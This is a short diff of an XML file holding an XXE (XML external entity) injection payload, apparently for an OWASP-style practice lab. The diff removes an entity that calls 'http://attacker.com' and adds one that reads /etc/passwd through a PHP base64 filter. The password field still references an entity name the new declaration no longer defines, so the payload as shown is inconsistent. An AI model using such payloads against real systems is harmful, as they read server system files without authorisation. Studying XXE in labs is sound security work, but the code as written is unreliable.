@@ -1,8 +1,5 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE
-	foo [ 
-	<!ENTITY xxe SYSTEM "http://attacker.com"> ]
->
+<!DOCTYPE replace [<!ENTITY example SYSTEM “php://filter/convert.base64-encode/resource=/etc/passwd”> ]>
 <owasp>
 	<username>HosseinAmini</username>
 	<password>&xxe;</password>
